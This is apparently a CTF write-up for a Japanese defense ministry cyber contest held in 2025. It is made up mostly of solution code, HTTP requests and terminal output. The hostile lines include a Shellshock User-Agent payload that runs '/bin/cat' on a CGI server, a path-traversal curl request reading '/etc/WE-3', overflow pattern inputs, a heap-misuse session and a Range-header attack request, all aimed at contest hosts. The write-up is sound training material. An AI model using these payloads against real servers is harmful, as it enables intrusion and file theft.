# 防衛省サイバーコンテスト2025 Writeup供養

> 原文: https://www.ctfiot.com/226942.html
> ID: 226942


```
#include <stdio.h>
int main(){
 int i,j,k,l;
 int cnt = 0;
 //k=(((10/2*4/10*4/2)+97)*10)-10;
 k = 10000000;
 printf("%d\n", k);
 for(i=2;i<=k;++i){
 l=0;
 for(j=2;j<i;++j){
 if(i%j==0){
 l=1;
 break;
 }
 }
 if(l==0){
 cnt += 1;
 printf("cnt:%d, %d\r\n",cnt, i);
 if(cnt == 314) break;
 }
 }
 return 0;
}
```



```
以下の要件を満たすプログラムを作成してください。 プログラムの言語は問いません。

引数として以下の値を指定できる。
第一引数：文字列
第二引数：文字列
プログラム内部で引数に以下の処理を加える。
それぞれの引数のハッシュ値を求める。ハッシュ関数にはRIPEMD160を使用する。
第一引数のハッシュ値の1文字目と第二引数のハッシュ値の1文字目を抜き出し、それらの値が両方数値だった場合、それらのXORを求める。そうでない場合は何も処理しない。
続いて、第一引数のハッシュ値の1文字目と第二引数のハッシュ値の2文字目を抜き出し、それらの値が両方数値だった場合、それらのXORを求める。そうでない場合は何も処理しない。
同様に、3文字目、4文字目と続け、と第二引数のハッシュ値の最後の文字まで行う。
続けて第一引数のハッシュ値の2文字目に対して第二引数のハッシュ値の1文字目から同様の処理を行う。
同様に第一引数のハッシュ値の3文字目、4文字目と続け、と第一引数のハッシュ値の最後の文字まで行う。
それぞれの値を加算する。
加算された値を10進数で出力する。
このプログラムに下記の引数を与えた時に出力される値を答えてください。

第一引数：Phoenix
第二引数：Messiah
【回答書式】 flag{n桁の半角数字}
```



```
HEAD / HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
HOST: 192.168.123.116
Range: bytes=0-,5-0,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9,5-10,5-11,5-12,5-13,5-14,5-15,5-16,5-17,5-18,5-19,5-20,5-21,5-22,5-23,5-24,5-25,5-26,5-27,5-28,5-29,5-30,5-31,5-32,5-33,5-34
(snip)
```



```
<!DOCTYPE html>
<html lang="ja-JP">
<head>
<meta charset="utf-8" />
<title>WE-1</title> 
</head>
<body>
<h2>このページにフラグがあります</h2>
</body>
</html>
<!-- flag{TakeMeToTheFlag} -->
```



```
<!-- @format -->

<!DOCTYPE html>
<html
 xmlns="http://www.w3.org/1999/xhtml"
 xml:lang="ja-JP"
 lang="ja-JP"
 prefix="og: http://ogp.me/ns#"
>
 <head>
 <meta charset="utf-8" />
 <meta name="robots" content="noindex" />
 <title>NO LIFE NO STONE</title>
 <!--<script type="text/javascript" src="secret/download.js"></script>-->
 </head>

 <body>
 <h2>そのへんの石</h2>
 ※ダウンロードの仕組みは調子悪いので(^^;
 欲しい方は画像を直接コピーしてね。<br />
 <hr />
 <img src="stone/WE-3-01.png" height="50" />
 <!-- <button onClick="dlFIle('WE-3-01')">ダウンロード</button> -->
 <img src="stone/WE-3-02.png" height="50" />
 <!-- <button onClick="dlFIle('WE-3-02')">ダウンロード</button> -->
 <img src="stone/WE-3-03.png" height="50" />
 <!-- <button onClick="dlFIle('WE-3-03')">ダウンロード</button> -->
 <img src="stone/WE-3-04.png" height="50" />
 <!-- <button onClick="dlFIle('WE-3-04')">ダウンロード</button> -->
 <img src="stone/WE-3-05.png" height="50" />
 <!-- <button onClick="dlFIle('WE-3-05')">ダウンロード</button> -->
 </body>
</html>
```



```
function dlFIle(file){
 var dataS = 'fName=' + file;
 var xhr = new XMLHttpRequest();
 xhr.open('POST','/secret/download.php');
 xhr.send(dataS);
 xhr.onload = function() {
 var strS = xhr.responseText;
 };
}
```



```
$ curl -X POST -d "fName=/etc/WE-3" https://we3-prod.2025winter-cybercontest.net/secret/download.php
<snip>
flag{fGrantUB56skBTlmF14mostFP}
```



```
POST /json.php HTTP/2
Host: we4-prod.2025winter-cybercontest.net
Cookie: PHPSESSID=iqissnh6b5gl2r1p3p98vu1bld
Content-Length: 45
Accept: */*
Origin: https://we4-prod.2025winter-cybercontest.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://we4-prod.2025winter-cybercontest.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn1d
```



```
POST /json.php HTTP/2
Host: we4-prod.2025winter-cybercontest.net
Cookie: PHPSESSID=iqissnh6b5gl2r1p3p98vu1bld
Content-Length: 85
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://we4-prod.2025winter-cybercontest.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://we4-prod.2025winter-cybercontest.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0=
```



```
楕円曲線のパラメータは以下の通りとします。

a=56,b=58,p=127

基準点(42,67)と設定した場合、公開鍵の値が下記になる秘密鍵の最も小さい値を答えてください。

公開鍵(53,30)
```



```
require './encode.rb'
flag = File.open("flag", "r").read()
generate = PeakeyEncode.new.generate(flag)
generate = generate.gsub(">", "🚒")
generate = generate.gsub("<", "😭")
generate = generate.gsub("+", "😡")
generate = generate.gsub("-", "🙌")
generate = generate.gsub(".", "🌺")
generate = generate.gsub(",", "✍️")
generate = generate.gsub("[", "😤")
generate = generate.gsub("]", "🐈")

sjis = generate.force_encoding(Encoding::SJIS)
p sjis.encode(Encoding::UTF_8)
```



```
file=File.binread("encryption")

file = file.force_encoding(Encoding::UTF_8).encode(Encoding::SJIS)
puts file
file = file.gsub("🚒",">")
file = file.gsub("😭","<")
file = file.gsub("😡","+")
file = file.gsub("🙌","-")
file = file.gsub("🌺",".")
file = file.gsub("✍",",")
file = file.gsub("😤","[")
file = file.gsub("🐈","]")
puts file
```



```
😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡🌺😡😡😡😡😡😡🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺😡😡😡😡😡😡🌺😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡🌺🙌🙌🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺😡😡😡😡😡😡🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺😡😡😡😡😡😡😡😡😡😡😡😡🌺😡😡😡🌺😡🌺😡😡😡😡😡😡😡😡🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺😡😡😡🌺😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🙌🌺😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡🌺😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡🌺

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.++++++.-----------.++++++.++++++++++++++++++++.--.----------.++++++.----------------------.++++++++++++.+++.+.++++++++.------------------------.+++.++++++++++++++++.-----------------.------------------------------------------------.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.+++++++++++++++.
```



```
192.168.100.106 - - [11/Jul/2024:09:36:24 +0900] "GET /index.php HTTP/1.1" 200 424
192.168.100.106 - - [11/Jul/2024:09:36:29 +0900] "POST /auth.php HTTP/1.1" 302 -
192.168.100.106 - - [11/Jul/2024:09:36:30 +0900] "GET /ctf/fr1/index.php?msg=2 HTTP/1.1" 200 478
192.168.100.106 - - [11/Jul/2024:09:45:54 +0900] "POST /auth.php HTTP/1.1" 302 -
192.168.100.106 - - [11/Jul/2024:09:46:00 +0900] "GET /mypage.php?sesid=MTc2NzIyNTU5OSw2LHVzZXI2 HTTP/1.1" 200 281
```



```
220 (vsFTPd 3.0.3)
USER agita
331 Please specify the password.
PASS wwwww
530 Login incorrect.
USER agita
331 Please specify the password.
PASS yyyyyyyy
530 Login incorrect.
USER agita
331 Please specify the password.
PASS zyyzzyzy
230 Login successful.
```



```
package jp.go.cybercontest.insecureapk;

import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
 protected void onCreate(Bundle paramBundle) {
 super.onCreate(paramBundle);
 setContentView(R.layout.activity_main);
 ((Button)findViewById(R.id.button)).setOnClickListener(new AppListener());
 }
 
 private class AppListener implements View.OnClickListener {
 private AppListener() {}
 
 public void onClick(View param1View) {
 EditText editText = (EditText)MainActivity.this.findViewById(R.id.inputText);
 TextView textView = (TextView)MainActivity.this.findViewById(R.id.flush);
 if (param1View.getId() == R.id.button) {
 String str = editText.getText().toString();
 if (str.length() != 16) {
 textView.setText("Incorrect.");
 } else if (SecretGenerater.decode(str).equals("VUSTIq@H~]wGSBVH")) {
 textView.setText("Congratulations! you got flag.");
 } else {
 textView.setText("Incorrect.");
 } 
 } 
 }
 }
}
```



```
package jp.go.cybercontest.insecureapk;

public class SecretGenerater {
 static {
 System.loadLibrary("insecureapp");
 }
 
 public static native String checkNative(String paramString);
 
 public static String decode(String paramString) {
 paramString = checkNative(paramString);
 return (paramString.length() == 16) ? paramString : "";
 }
}
```



```
$ curl -A "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/PW-1" https://pw1-prod.2025winter-cybercontest.net/cgi-bin/n.cgi
flag{>:(!shellshock!}
```



```
└─$ nc pw4-prod.2025winter-cybercontest.net 30001
　∧,,∧
（=・ω・）meow
（,, ｕｕ)

What's the cat's say?
AAA%AAsAABAA$AAnAACAA-AAwodm
Yes, I'll give you a flag.
flag{I_will_Golondon}
```



```
$ nc pw5-prod.2025winter-cybercontest.net 30001
　∧,,∧
（=・ω・）
（,, ｕｕ)
Dog goes woof.
Then, Cat?

1. Print Heap
2. Allocate Cat
3. Print cat->says
4. Free cat
5. Exit

Enter your choice: 4

1. Print Heap
2. Allocate Cat
3. Print cat->says
4. Free cat
5. Exit

Enter your choice: 2
What does the cat say?
AAA%AAsAABAA$AAnAACAA-AAmeow
Congratulations!
flag{cat_g0es_me0w}
```



```
@echo off
setlocal
set FDATA1=23
set FDATA2=61
set FDATA3=34
set FDATA4=25
set FDATA5=75
set FDATA6=64
set FDATA7=93
set FDATA8=44
set FDATA9=72
md flags
chdir flags
for /l %%n in (10,1,99) do (
 type null > flags_%%n.txt
 echo flag{%FDATA5%%FDATA4%%%n%FDATA1%%FDATA6%%FDATA2%%%n%FDATA3%%FDATA7%%FDATA9%%FDATA8%} > flags_%%n.txt
 if %%n==%FDATA4% echo > flags_%%n.txt:TrueFlag
)

endlocal
```



```
>>> with open("pattern1", "rb") as f:
... d1=f.read()
...
>>> with open("compare","rb") as f:
... c=f.read()
...
>>> with open("pattern2", "rb") as f:
... d2=f.read()
...
>>> with open("pattern3", "rb") as f:
... d3=f.read()
...
>>> "".join([chr(d1[i] ^ c[i]) for i in range(len(c))])
'find1\x05\x1b?4/'
>>> "".join([chr(d2[i] ^ c[i]) for i in range(len(c))])
'ciBd*\x16z\x95SQ'
>>> "".join([chr(d3[i] ^ c[i]) for i in range(len(c))])
'flag{¬\x1dïý}'
```



```
>>> [chr(d3[i] ^ c[i]) for i in range(len(c))]
['f', 'l', 'a', 'g', '{', '¬', '\x1d', 'ï', 'ý', '}']
>>> [d3[i] ^ c[i] for i in range(len(c))]
[102, 108, 97, 103, 123, 172, 29, 239, 253, 125]
```
